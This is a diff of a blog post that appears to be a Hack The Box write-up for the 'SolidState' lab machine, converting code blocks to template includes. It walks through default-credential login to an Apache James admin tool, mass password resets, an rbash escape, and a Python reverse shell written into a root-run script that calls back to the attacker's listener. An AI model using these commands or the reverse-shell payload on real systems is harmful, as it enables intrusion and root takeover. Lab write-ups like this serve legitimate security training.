@@ -27,8 +27,7 @@ SolidState seems like a pretty solid choice for the next box!
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.51 
 [sudo] password for kali: 
@@ -63,14 +62,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 115.42 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all the ports to find any non-standard services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.51 
 [sudo] password for kali: 
@@ -87,14 +85,13 @@ PORT     STATE SERVICE
 4555/tcp open  rsip
 
 Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run curl to see if there is any interesting information in the headers.
 
-{% raw %}
-```sh
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ curl -I http://10.10.10.13
 HTTP/1.1 200 OK
@@ -106,8 +103,8 @@ Accept-Ranges: bytes
 Content-Length: 11439
 Vary: Accept-Encoding
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page that is being served on port 80.
@@ -121,8 +118,7 @@ Check the landing page that is being served on port 80.
 <br />
 Looking up the James mail.  Apparently, it is maintained by Apache.  So, the service running on port 4555 is the administration panel.  I has the default credentials of root:root.  Let's use telnet to connect and test the creds.  Netcat kept freezing.
 
-{% raw %}
-```sh
+{% capture loginjames %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ nc 10.10.10.51 4555
 JAMES Remote Administration Tool 2.3.2
@@ -132,14 +128,13 @@ root
 Password:
 root
 Welcome root. HELP for a list of commands
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loginjames %}
 
 <br />
 Type help to get a list of commands that we can run.
 
-{% raw %}
-```sh
+{% capture dumphelp %}
 HELP 
 Currently implemented commands:
 help                                    display this help
@@ -158,14 +153,13 @@ unsetforwarding [username]              removes a forward
 user [repositoryname]                   change to another user repository
 shutdown                                kills the current JVM (convenient when James is run as a daemon)
 quit                                    close connection
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=dumphelp %}
 
 <br />
 Use the listusers to get a list of all the users on the mail system.
 
-{% raw %}
-```sh
+{% capture listusers %}
 listusers
 Existing accounts 5
 user: james
@@ -173,14 +167,13 @@ user: thomas
 user: john
 user: mindy
 user: mailadmin
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listusers %}
 
 <br />
 Reset all of their passwords so we can break into all of their mail accounts.
 
-{% raw %}
-```sh
+{% capture resetpasswords %}
 setpassword james letmein
 Password for james reset
 setpassword thomas letmein
@@ -193,14 +186,13 @@ setpassword mailadmin letmein
 Password for mailadmin reset
 quit
 Bye
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=resetpasswords %}
 
 <br />
 The first mailbox we will check is the John mailbox.  It is asking to restrict Mindy's account and assign her a temp password.  Good to know.
 
-{% raw %}
-```sh
+{% capture telnetjohn %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ telnet 10.10.10.51 110
 Trying 10.10.10.51...
@@ -240,14 +232,13 @@ Respectfully,
 James
 
 .
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=telnetjohn %}
 
 <br />
 Let's check Mindy's account next since it was mentioned in John's email.  Hey, a password!
 
-{% raw %}
-```sh
+{% capture telnetmindy %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ telnet 10.10.10.51 110
 Trying 10.10.10.51...
@@ -319,14 +310,13 @@ James
 QUIT
 +OK Apache James POP3 Server signing off.
 Connection closed by foreign host.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=telnetmindy %}
 
 <br />
 Check the other boxes if you feel the need.  None of them have anything interesting.
 
-{% raw %}
-```sh
+{% capture telnetjames %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ telnet 10.10.10.51 110     
 Trying 10.10.10.51...
@@ -343,10 +333,10 @@ LIST
 QUIT
 +OK Apache James POP3 Server signing off.
 Connection closed by foreign host.
-```
-{% endraw %}
-{% raw %}
-```sh
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=telnetjames %}
+
+{% capture telnetthomas %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ telnet 10.10.10.51 110
 Trying 10.10.10.51...
@@ -363,10 +353,10 @@ LIST
 QUIT
 +OK Apache James POP3 Server signing off.
 Connection closed by foreign host.
-```
-{% endraw %}
-{% raw %}
-```sh
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=telnetthomas %}
+
+{% capture telnetmailadmin %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ telnet 10.10.10.51 110
 Trying 10.10.10.51...
@@ -383,14 +373,13 @@ LIST
 QUIT
 +OK Apache James POP3 Server signing off.
 Connection closed by foreign host.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=telnetmailadmin %}
 
 <br />
 Use the creds from Mindy's email to ssh into the server.
 
-{% raw %}
-```sh
+{% capture sshmindy %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ ssh mindy@10.10.10.51                          
 The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
@@ -409,18 +398,17 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
 mindy@solidstate:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshmindy %}
 
 <br />
 Confirm the rbash shell.
 
-{% raw %}
-```sh
+{% capture confirmrbash %}
 mindy@solidstate:~$ whoami
 -rbash: whoami: command not found
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=confirmrbash %}
 
 <br />
 Research different rbash escape methods.
@@ -437,8 +425,7 @@ Research different rbash escape methods.
 <br />
 Check the environment variables.
 
-{% raw %}
-```sh
+{% capture checkenvar %}
 mindy@solidstate:~$ export -p
 declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1001/bus"
 declare -x HOME="/home/mindy"
@@ -457,24 +444,22 @@ declare -x TERM="xterm-256color"
 declare -x USER="mindy"
 declare -x XDG_RUNTIME_DIR="/run/user/1001"
 declare -x XDG_SESSION_ID="17"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkenvar %}
 
 <br />
 Try updating the PATH.
 
-{% raw %}
-```sh
+{% capture updatepath %}
 mindy@solidstate:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 -rbash: PATH: readonly variable
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=updatepath %}
 
 <br />
 Check the bin folder to see what we can run.
 
-{% raw %}
-```sh
+{% capture checkbin %}
 mindy@solidstate:~$ ls -la bin/
 total 8
 drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 .
@@ -482,14 +467,13 @@ drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 ..
 lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -> /bin/cat
 lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /bin/env
 lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkbin %}
 
 <br />
 Run compgen -c to get a list of commands that we can run.
 
-{% raw %}
-```sh
+{% capture runcompgen %}
 mindy@solidstate:~$ compgen -c
 if
 then
@@ -504,26 +488,31 @@ while
 until
 
 <snip>
+
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runcompgen %}
+
+{% raw %}
+```sh
+
 ```
 {% endraw %}
 
 <br />
 Logout of the ssh session and log back in using the -t option with no profile to try and stop the rbash from loading.
 
-{% raw %}
-```sh
+{% capture loginnoprofile %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ ssh mindy@10.10.10.51 -t "bash --noprofile"
 mindy@10.10.10.51's password: 
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loginnoprofile %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
 <redacted>
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ip a
@@ -541,24 +530,22 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ip a
        valid_lft 86396sec preferred_lft 14396sec
     inet6 fe80::250:56ff:feb9:44de/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run uname -a to get the Linux version.
 
-{% raw %}
-```sh
+{% capture rununame %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ uname -a
 Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rununame %}
 
 <br />
 Download linpeas.sh to the local working folder.
 
-{% raw %}
-```sh
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
 --2025-02-15 01:41:46--  https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
@@ -581,14 +568,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
-Transfer linpeassh to the victim machine.
+Transfer linpeas to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferlinpeas %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.16.12:8000/linpeas.sh
 --2025-02-14 09:42:47--  http://10.10.16.12:8000/linpeas.sh
 Connecting to 10.10.16.12:8000... connected.
@@ -604,14 +590,13 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x
 chmod: missing operand after ‘+x’
 Try 'chmod --help' for more information.
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferlinpeas %}
 
 <br />
 Give the peas a run.
 
-{% raw %}
-```sh
+{% capture runpeas %}
 <snip>
 
 ╔══════════╣ Cron jobs
@@ -698,14 +683,13 @@ Sat 2025-02-15 06:45:34 EST  21h left   Fri 2025-02-14 08:39:14 EST  1h 4min ago
 Sat 2025-02-15 08:53:36 EST  23h left   Fri 2025-02-14 08:53:36 EST  50min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Curl localhost on port 631.
 
-{% raw %}
-```sh
+{% capture curllocalhost %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ curl 127.0.0.1:631
 <!DOCTYPE HTML>
 <html>
@@ -716,8 +700,8 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ curl 127.0.0.1:631
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=9">
     <meta name="viewport" content="width=device-width">
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curllocalhost %}
 
 <br />
 Ok.  So, at this point, there is another exploit on exploit-db for the James server.  I ran it.  I am not going to include it in this write-up because it would only be useful if you couldn't break rbash.  But, here is the link if you want to give it a run yourself.
@@ -727,8 +711,7 @@ Ok.  So, at this point, there is another exploit on exploit-db for the James ser
 <br />
 Researching the installation of the James server indicates the the recommended installation location is opt.  So, let's run ls -la against the opt folder.
 
-{% raw %}
-```sh
+{% capture lsopt %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
 ls -la
 total 16
@@ -737,16 +720,18 @@ drwxr-xr-x 22 root root 4096 May 27  2022 ..
 drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
 -rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
     <meta name="viewport" content="width=device-width">
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lsopt %}
 
 <br />
 Well, that tmp.py looks mighty tempting being all writeable and everything.  So, on the attach machine, create a tmp.py file using <a href="https://revshells.com">revshells</a> as the base.
 
-{% raw %}
-```sh
+{% capture catlocaltmp %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
-└─$ cat tmp.py                  
+└─$ cat tmp.py        
+{% endcapture %}
+
+{% capture localtmp %}
 import socket,subprocess,os,pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -755,30 +740,35 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
-                                                                                                                                                                                                                                            
+{% endcapture %}
+
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catlocaltmp %}
+
+{% include terminal.html language='python' title='tmp.py' content=localtmp %}
+
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Transfer the tmp.py to the victim machine.
 
-{% raw %}
-```sh
+{% capture transfertmppy %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.16.12:8000/tmp.py
 wget 10.10.16.12:8000/tmp.py
 --2025-02-15 19:38:54--  http://10.10.16.12:8000/tmp.py
@@ -790,18 +780,20 @@ Saving to: ‘tmp.py’
      0K                                                       100%  236K=0.001s
 
 2025-02-15 19:38:54 (236 KB/s) - ‘tmp.py’ saved [204/204]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transfertmppy %}
 
 <br />
 Copy the file to overwrite the /opt/tmp.py file.
 
-{% raw %}
-```sh
+{% capture overwritetmppy %}
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cp tmp.py /opt/tmp.py
 cp tmp.py /opt/tmp.py
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
 cat /opt/tmp.py
+{% endcapture %}
+
+{% capture malwritetmppy %}
 import socket,subprocess,os,pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -810,28 +802,29 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=overwritetmppy %}
+
+{% include terminal.html language='python' title='tmp.py' content=malwritetmppy %}
 
 <br />
 Now, I didn't see the tmp.py in the cron jobs or timers of linpeas.  It only appeared in the interesting files sections.  So, I will go on investigating the James installation in the opt folder, maybe find a trigger or credentials in a conf file, who knows..  While exploritizing, I keep an eye on my listener.  Unitl one time...hey, a shell!  Neat.
 
-{% raw %}
-```sh
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/solidstate]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.51] 45954
 root@solidstate:~#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 cat /root/root.txt
 <redacted>
 root@solidstate:~# ip a
@@ -850,8 +843,8 @@ ip a
        valid_lft 86393sec preferred_lft 14393sec
     inet6 fe80::250:56ff:feb9:d8dd/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 So, this is the final state of SolidState.  Hopefully, you enjoyed.
